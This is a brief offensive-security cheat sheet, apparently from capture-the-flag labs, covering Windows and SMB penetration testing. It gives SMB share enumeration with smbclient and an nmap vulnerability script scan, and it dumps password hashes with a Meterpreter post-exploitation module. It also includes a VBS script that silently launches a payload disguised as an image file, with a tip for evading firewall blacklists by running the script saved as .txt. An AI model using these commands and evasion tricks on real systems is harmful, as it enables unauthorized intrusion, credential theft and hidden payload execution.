For SMB

    smbclient -L //ip/
  
`this shows the directory on smb listening`

    smbclient //ip/{directory from above command}
  
For SMB Exploit 

    nmap -sC -sV -A ip --script=smb-vuln*
  
hashdump of windows

`inside the meterpreter shell` 

    run post/windows/gather/hashdump

Searching Files or Flag in windows machine

    dir flag*.txt /s /p
Fatching the usernames of the machine

    net users
    
VBS script 

```
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "D:\back.jpg" & Chr(34), 0
WshShell.Run chr(34) & "C:\Program Files\Google\Chrome\Application\chrome.exe" & Chr(34), 0
Set WshShell = Nothing
```
   
save it as file.vbs , in case firewall detects or blacklist vbs file you can save it as txt file and still run it as vbs with bellow command 

    wscript /e:VBScript c:\Users\thm\Desktop\payload.txt


